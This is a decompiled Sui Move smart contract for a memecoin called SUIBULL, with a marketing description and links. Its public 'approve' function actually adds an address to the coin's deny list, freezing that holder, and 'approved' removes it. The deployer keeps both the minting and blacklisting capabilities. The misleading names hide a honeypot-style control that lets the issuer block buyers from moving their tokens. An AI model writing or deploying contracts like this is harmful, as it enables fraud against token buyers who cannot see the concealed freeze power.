module 0x493fb7bcd57493b2b500c22b71da8db72d637f3e05c1b7a2bc17ea959ad81074::suibull {
    struct SUIBULL has drop {
        dummy_field: bool,
    }

    public entry fun transfer(arg0: 0x2::coin::Coin<SUIBULL>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<SUIBULL>>(arg0, arg1);
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIBULL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUIBULL>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIBULL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUIBULL>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SUIBULL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUIBULL>(arg0, 2, b"SUIBULL", b"SUIBULL", b"Sui Bull Coin is your reliable friend on Sui! Charge through the crypto landscape with strength and resilience. https://suibull.tech/ - https://t.me/Suibullcon - https://x.com/bullsuicoin", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suibull.tech/images/logo.jpg"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUIBULL>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<SUIBULL>(&mut v3, 100000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SUIBULL>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUIBULL>>(v1, v4);
    }

    // decompiled from Move bytecode v6
}

